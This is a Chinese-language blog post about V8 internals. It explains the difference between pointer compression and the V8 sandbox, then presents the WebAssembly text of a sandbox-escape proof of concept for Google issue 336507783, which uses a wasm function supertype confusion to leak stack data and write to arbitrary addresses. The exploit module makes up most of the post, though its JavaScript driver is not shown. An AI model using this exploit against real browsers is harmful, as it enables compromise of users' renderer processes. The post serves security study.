---
title: wasm-issue
date: 2026-04-20 13:29:28
categories: chrome/v8研究
tags: [ wasm, v8, sandbox ]
---
介绍下实习的时候师傅给我的v8沙箱逃逸poc. 首先两句话带过一下v8的沙箱吧.
先说一点, 指针压缩和沙箱不是同一个东西, 最开始我也搞混了这两点.
指针压缩指的是64位下用32位的偏移在js堆上索引的方式, 而沙箱要求这个js堆沙箱上不允许出现任何64位指针, 也就是要求即使攻击者控制了沙箱内部, 也不能轻而易举的继续控制整个renderer进程
(不过很有意思的一点, 泛泛的说, 有存在意义且会与外界交互的的沙箱就肯定会对外界产生影响, 这个层面上说完全安全的沙箱似乎不存在?)

所以常规浏览器完整利用的第一步是控制js堆沙箱, 第二步就是逃v8的沙箱.
拿到的沙箱逃逸poc好像没有cve编号, 只有一个谷歌的issue编号[336507783], 原理是将wasm函数的super类改掉, 做到一个类型混淆. 从而泄露wasm栈上的数据, 或是欺骗wasm函数向任意地址写入你要求的值(它以为这是一个v8的对象, 但你传进去的实际是一个普通地址)

在逃逸之前把reader, writer的super type设置为pwner, 把nop的super type设置为leak.
以nop和leak为例, 由于leak的函数签名是很多个i64返回值, 所以在执行nop时, 会将wasm栈上的数据以一个BigInt64Array的形式在js层面返回(我也只知道个大致原因, 还没仔细研究..), 而wasm栈上就有很多可以利用的地址了.
```wat
(module
  (type $long_stack_func (sub (func (result i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64))))
  (type $sup_read_write (sub (func (param i64 i64) (result i64))))
  (type $struct_funcref (sub (struct (field (mut funcref)))))
  (type $struct_i64 (sub (struct (field (mut i64)))))

  (table (;0;) 1 1 funcref ref.func $nop)
  (export "reader" (func $reader))
  (export "writer" (func $writer))
  (export "pwner" (func $pwner))
  (export "vuln" (func $vuln))
  (export "nop" (func $nop))
  (export "rec" (func $rec))
  (export "leak" (func $leak))
  (export "leak_rec" (func $leak_rec))
  (export "get_reader" (func $get_reader))
  (export "get_writer" (func $get_writer))
  (export "get_pwner" (func $get_pwner))
  (export "get_nop" (func $get_nop))
  (export "get_leak" (func $get_leak))
  (export "table" (table 0))
  (func $writer (param i64 (ref $struct_i64))
    local.get 1
    local.get 0
    struct.set $struct_i64 0
  )
  (func $reader (param (ref $struct_i64)) (result i64)
    local.get 0
    struct.get $struct_i64 0
  )
  (func $pwner (type $sup_read_write) (param i64 i64) (result i64)
    local.get 1
    local.get 0
    i32.const 0
    call_indirect (type $sup_read_write)
  )
  (func $vuln (result i64)
    i64.const 0xfffffffffffffffd
    i64.const 0xfffffffffffffffc
    i64.mul
  )
  (func $nop)
  (func $rec (param i32)
    block ;; label = @1
      local.get 0
      i32.const 1
      i32.sub
      local.tee 0
      i32.eqz
      br_if 0 (;@1;)
      local.get 0
      call $rec
    end
  )
  (func $leak (result i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)
    i32.const 0
    call_indirect (type $long_stack_func)
  )
  (func $leak_rec (result i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64 i64)
    i32.const 48
    call $rec
    call $leak
  )
  (func $get_nop (result externref)
    ref.func $nop
    struct.new $struct_funcref
    extern.convert_any
  )
  (func $get_leak (result externref)
    ref.func $leak
    struct.new $struct_funcref
    extern.convert_any
  )
  (func $get_reader (result externref)
    ref.func $reader
    struct.new $struct_funcref
    extern.convert_any
  )
  (func $get_writer (result externref)
    ref.func $writer
    struct.new $struct_funcref
    extern.convert_any
  )
  (func $get_pwner (result externref)
    ref.func $pwner
    struct.new $struct_funcref
    extern.convert_any
  )
)
```
